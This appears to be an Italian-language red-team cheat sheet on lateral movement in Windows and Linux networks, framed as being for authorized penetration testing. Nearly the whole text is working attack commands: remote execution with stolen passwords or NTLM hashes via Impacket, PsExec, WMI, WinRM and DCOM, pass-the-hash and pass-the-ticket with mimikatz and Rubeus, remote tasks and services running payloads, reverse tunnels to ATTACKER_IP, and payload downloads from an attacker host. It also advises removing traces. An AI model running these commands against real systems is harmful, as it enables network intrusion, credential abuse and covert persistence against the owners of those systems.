# Lateral Movement

## Scopo

Questa guida copre tecniche di movimento laterale per spostarsi tra sistemi in una rete compromessa durante penetration test e red team engagement.

## Prerequisiti

- Foothold iniziale in rete
- Credenziali o hash ottenuti
- Conoscenza della topologia
- **Autorizzazione per testing**

---

## Windows Lateral Movement

### PsExec

```bash
# Impacket PsExec
impacket-psexec domain/user:password@TARGET

# Con hash (Pass-the-Hash)
impacket-psexec -hashes :NTLM_HASH domain/user@TARGET

# Sysinternals PsExec
psexec.exe \\TARGET -u domain\user -p password cmd.exe
```

### WMI

```bash
# Impacket wmiexec
impacket-wmiexec domain/user:password@TARGET

# Con hash
impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET

# PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET -Credential $cred
```

### SMB

```bash
# Impacket smbexec
impacket-smbexec domain/user:password@TARGET

# Mounting share
net use \\TARGET\C$ /user:domain\user password
copy payload.exe \\TARGET\C$\Windows\Temp\
```

### WinRM

```bash
# Evil-WinRM
evil-winrm -i TARGET -u user -p password

# Con hash
evil-winrm -i TARGET -u user -H NTLM_HASH

# PowerShell
Enter-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami} -Credential $cred
```

### DCOM

```bash
# Impacket dcomexec
impacket-dcomexec domain/user:password@TARGET

# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

### RDP

```bash
# xfreerdp
xfreerdp /v:TARGET /u:user /p:password

# Con hash (Restricted Admin Mode)
xfreerdp /v:TARGET /u:user /pth:NTLM_HASH

# Pass-the-Hash RDP
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:"mstsc.exe /restrictedadmin"
```

### Scheduled Tasks

```powershell
# Remoto
schtasks /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00 /s TARGET /u domain\user /p password

# Esegui subito
schtasks /run /tn "Updater" /s TARGET /u domain\user /p password
```

### Services

```powershell
# Crea e avvia servizio remoto
sc \\TARGET create MyService binpath= "cmd.exe /c C:\payload.exe"
sc \\TARGET start MyService
```

---

## Pass-the-Hash

```bash
# Crackmapexec
crackmapexec smb TARGET -u user -H NTLM_HASH -x "whoami"

# Impacket
impacket-psexec -hashes :NTLM_HASH domain/user@TARGET

# Mimikatz
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

---

## Pass-the-Ticket

```bash
# Export ticket
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64ticket
```

---

## Overpass-the-Hash

```bash
# Converti NTLM hash in Kerberos ticket
mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# Rubeus
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
```

---

## SSH (Linux)

```bash
# Standard
ssh user@TARGET

# Con chiave
ssh -i id_rsa user@TARGET

# ProxyJump per pivot
ssh -J pivot_user@PIVOT target_user@TARGET

# Port forward
ssh -L 8080:localhost:80 user@TARGET
ssh -D 1080 user@TARGET  # SOCKS proxy
```

---

## Pivoting

### SSH Tunnels

```bash
# Local port forward
ssh -L LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@PIVOT

# Dynamic (SOCKS)
ssh -D 1080 user@PIVOT
# Usa con proxychains

# Remote port forward
ssh -R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT user@PIVOT
```

### Chisel

```bash
# Server (attacker)
chisel server -p 8080 --reverse

# Client (target)
chisel client ATTACKER_IP:8080 R:socks

# Use con proxychains
# socks5 127.0.0.1 1080
```

### Ligolo-ng

```bash
# Attacker (proxy)
./proxy -selfcert

# Agent (target)
./agent -connect ATTACKER_IP:11601 -retry -ignore-cert

# Aggiungere route
session
start
```

### Metasploit

```bash
# Autoroute
meterpreter > run autoroute -s 192.168.1.0/24

# SOCKS proxy
meterpreter > run auxiliary/server/socks_proxy

# Port forward
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
```

### Proxychains

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Usage
proxychains4 nmap -sT -Pn 192.168.1.0/24
proxychains4 crackmapexec smb 192.168.1.0/24
```

---

## Network Discovery

```bash
# ARP scan
arp-scan -I eth0 192.168.1.0/24

# Nmap via proxy
proxychains nmap -sT -Pn 192.168.1.0/24

# PowerShell
1..254 | % {"192.168.1.$_: $(Test-Connection -Count 1 -Quiet 192.168.1.$_)"}

# Bash
for i in {1..254}; do ping -c 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done
```

---

## File Transfers

### Windows

```powershell
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\file
(New-Object Net.WebClient).DownloadFile("http://ATTACKER/file","C:\file")

# Certutil
certutil -urlcache -split -f http://ATTACKER/file C:\file

# SMB
copy \\ATTACKER\share\file C:\file
```

### Linux

```bash
# Wget/Curl
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file

# Netcat
nc -lvnp 4444 > file  # Receiver
nc TARGET 4444 < file  # Sender

# SCP
scp user@TARGET:/remote/file /local/path
```

---

## Tools

| Tool | Uso |
|------|-----|
| CrackMapExec | Multi-protocol execution |
| Impacket | Python implementation |
| Evil-WinRM | WinRM shell |
| Chisel | TCP tunneling |
| Ligolo-ng | Tunneling |
| Proxychains | SOCKS proxy |

---

## Best Practices

- **Minimize traffic**: Solo connessioni necessarie
- **Use native tools**: LOLBAS/GTFOBins
- **Credentials**: Sicuro storage
- **Logging**: Documenta movimenti
- **Cleanup**: Rimuovi tracce

## Riferimenti

- [MITRE ATT&CK Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- [Chisel](https://github.com/jpillora/chisel)
